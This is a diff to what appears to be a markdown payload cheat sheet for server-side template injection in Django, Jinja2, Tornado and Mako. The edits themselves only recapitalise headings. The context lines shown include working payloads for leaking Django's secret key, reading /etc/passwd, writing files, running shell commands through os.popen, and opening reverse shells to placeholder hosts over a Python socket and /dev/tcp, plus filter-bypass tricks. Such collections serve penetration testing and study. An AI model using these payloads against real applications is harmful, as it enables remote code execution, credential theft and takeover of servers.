@@ -7,29 +7,29 @@
 
 - [Templating Libraries](#templating-libraries)
 - [Django](#django)
-    - [Django - Basic injection](#django---basic-injection)
-    - [Django - Cross-site scripting](#django---cross-site-scripting)
-    - [Django - Debug information leak](#django---debug-information-leak)
-    - [Django - Leaking app's Secret Key](#django---leaking-apps-secret-key)
+    - [Django - Basic Injection](#django---basic-injection)
+    - [Django - Cross-Site Scripting](#django---cross-site-scripting)
+    - [Django - Debug Information Leak](#django---debug-information-leak)
+    - [Django - Leaking App's Secret Key](#django---leaking-apps-secret-key)
     - [Django - Admin Site URL leak](#django---admin-site-url-leak)
-    - [Django - Admin username and password hash leak](#django---admin-username-and-password-hash-leak)
+    - [Django - Admin Username and Password Hash Leak](#django---admin-username-and-password-hash-leak)
 - [Jinja2](#jinja2)
-    - [Jinja2 - Basic injection](#jinja2---basic-injection)
-    - [Jinja2 - Template format](#jinja2---template-format)
+    - [Jinja2 - Basic Injection](#jinja2---basic-injection)
+    - [Jinja2 - Template Format](#jinja2---template-format)
     - [Jinja2 - Debug Statement](#jinja2---debug-statement)
-    - [Jinja2 - Dump all used classes](#jinja2---dump-all-used-classes)
-    - [Jinja2 - Dump all config variables](#jinja2---dump-all-config-variables)
-    - [Jinja2 - Read remote file](#jinja2---read-remote-file)
-    - [Jinja2 - Write into remote file](#jinja2---write-into-remote-file)
+    - [Jinja2 - Dump All Used Classes](#jinja2---dump-all-used-classes)
+    - [Jinja2 - Dump All Config Variables](#jinja2---dump-all-config-variables)
+    - [Jinja2 - Read Remote File](#jinja2---read-remote-file)
+    - [Jinja2 - Write Into Remote File](#jinja2---write-into-remote-file)
     - [Jinja2 - Remote Command Execution](#jinja2---remote-command-execution)
-        - [Forcing output on blind RCE](#jinja2---forcing-output-on-blind-rce)
-        - [Exploit the SSTI by calling os.popen().read()](#exploit-the-ssti-by-calling-ospopenread)
-        - [Exploit the SSTI by calling subprocess.Popen](#exploit-the-ssti-by-calling-subprocesspopen)
-        - [Exploit the SSTI by calling Popen without guessing the offset](#exploit-the-ssti-by-calling-popen-without-guessing-the-offset)
-        - [Exploit the SSTI by writing an evil config file.](#exploit-the-ssti-by-writing-an-evil-config-file)
-    - [Jinja2 - Filter bypass](#jinja2---filter-bypass)
+        - [Forcing Output On Blind RCE](#jinja2---forcing-output-on-blind-rce)
+        - [Exploit The SSTI By Calling os.popen().read()](#exploit-the-ssti-by-calling-ospopenread)
+        - [Exploit The SSTI By Calling subprocess.Popen](#exploit-the-ssti-by-calling-subprocesspopen)
+        - [Exploit The SSTI By Calling Popen Without Guessing The Offset](#exploit-the-ssti-by-calling-popen-without-guessing-the-offset)
+        - [Exploit The SSTI By Writing an Evil Config File](#exploit-the-ssti-by-writing-an-evil-config-file)
+    - [Jinja2 - Filter Bypass](#jinja2---filter-bypass)
 - [Tornado](#tornado)
-    - [Tornado - Basic injection](#tornado---basic-injection)
+    - [Tornado - Basic Injection](#tornado---basic-injection)
     - [Tornado - Remote Command Execution](#tornado---remote-command-execution)    
 - [Mako](#mako)
     - [Mako - Remote Command Execution](#mako---remote-command-execution)
@@ -54,7 +54,7 @@
 
 Django template language supports 2 rendering engines by default: Django Templates (DT) and Jinja2. Django Templates is much simpler engine. It does not allow calling of passed object functions and impact of SSTI in DT is often less severe than in Jinja2.
 
-### Django - Basic injection
+### Django - Basic Injection
 
 ```python
 {% csrf_token %} # Causes error with Jinja2
@@ -63,20 +63,20 @@ ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r
 ```
 
 
-### Django - Cross-site scripting
+### Django - Cross-Site Scripting
 
 ```python
 {{ '<script>alert(3)</script>' }}
 {{ '<script>alert(3)</script>' | safe }}
 ```
 
-### Django - Debug information leak
+### Django - Debug Information Leak
 
 ```python
 {% debug %}
 ```
 
-### Django - Leaking app’s Secret Key
+### Django - Leaking App's Secret Key
 
 ```python
 {{ messages.storages.0.signer.key }}
@@ -89,7 +89,7 @@ ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r
 {% include 'admin/base.html' %}
 ```
 
-### Django - Admin username and password hash leak
+### Django - Admin Username And Password Hash Leak
 
 
 ```
@@ -104,7 +104,7 @@ ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r
 [Official website](https://jinja.palletsprojects.com/)
 > Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.  
 
-### Jinja2 - Basic injection
+### Jinja2 - Basic Injection
 
 ```python
 {{4*4}}[[5*5]]
@@ -115,7 +115,7 @@ ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r
 Jinja2 is used by Python Web Frameworks such as Django or Flask.
 The above injections have been tested on a Flask application.
 
-### Jinja2 - Template format
+### Jinja2 - Template Format
 
 ```python
 {% extends "layout.html" %}
@@ -139,7 +139,7 @@ If the Debug Extension is enabled, a `{% debug %}` tag will be available to dump
 
 Source: https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement
 
-### Jinja2 - Dump all used classes
+### Jinja2 - Dump All Used Classes
 
 ```python
 {{ [].class.base.subclasses() }}
@@ -153,7 +153,7 @@ Access `__globals__` and `__builtins__`:
 {{ self.__init__.__globals__.__builtins__ }}
 ```
 
-### Jinja2 - Dump all config variables
+### Jinja2 - Dump All Config Variables
 
 ```python
 {% for key, value in config.iteritems() %}
@@ -162,7 +162,7 @@ Access `__globals__` and `__builtins__`:
 {% endfor %}
 ```
 
-### Jinja2 - Read remote file
+### Jinja2 - Read Remote File
 
 ```python
 # ''.__class__.__mro__[2].__subclasses__()[40] = File class
@@ -172,7 +172,7 @@ Access `__globals__` and `__builtins__`:
 {{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
 ```
 
-### Jinja2 - Write into remote file
+### Jinja2 - Write Into Remote File
 
 ```python
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
@@ -186,7 +186,7 @@ Listen for connection
 nc -lnvp 8000
 ```
 
-#### Jinja2 - Forcing output on blind RCE
+#### Jinja2 - Forcing Output On Blind RCE
 
 You can import Flask functions to return an output from the vulnerable page.
 
@@ -203,7 +203,7 @@ def hook(*args, **kwargs):
 ```
 
 
-#### Exploit the SSTI by calling os.popen().read()
+#### Exploit The SSTI By Calling os.popen().read()
 
 ```python
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
@@ -235,7 +235,7 @@ With [objectwalker](https://github.com/p0dalirius/objectwalker) we can find a pa
 
 Source: https://twitter.com/podalirius_/status/1655970628648697860
 
-#### Exploit the SSTI by calling subprocess.Popen
+#### Exploit The SSTI By Calling subprocess.Popen
 
 :warning: the number 396 will vary depending of the application.
 
@@ -244,7 +244,7 @@ Source: https://twitter.com/podalirius_/status/1655970628648697860
 {{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
 ```
 
-#### Exploit the SSTI by calling Popen without guessing the offset
+#### Exploit The SSTI By Calling Popen Without Guessing The Offset
 
 ```python
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
@@ -257,7 +257,7 @@ In another GET parameter include a variable named "input" that contains the comm
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
 ```
 
-#### Exploit the SSTI by writing an evil config file.
+#### Exploit The SSTI By Writing An Evil Config File
 
 ```python
 # evil config
@@ -270,7 +270,7 @@ In another GET parameter include a variable named "input" that contains the comm
 {{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
 ```
 
-### Jinja2 - Filter bypass
+### Jinja2 - Filter Bypass
 
 ```python
 request.__class__
@@ -313,7 +313,7 @@ Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by http
 
 ## Tornado
 
-### Tornado - Basic injection
+### Tornado - Basic Injection
 
 ```py
 {{7*7}}
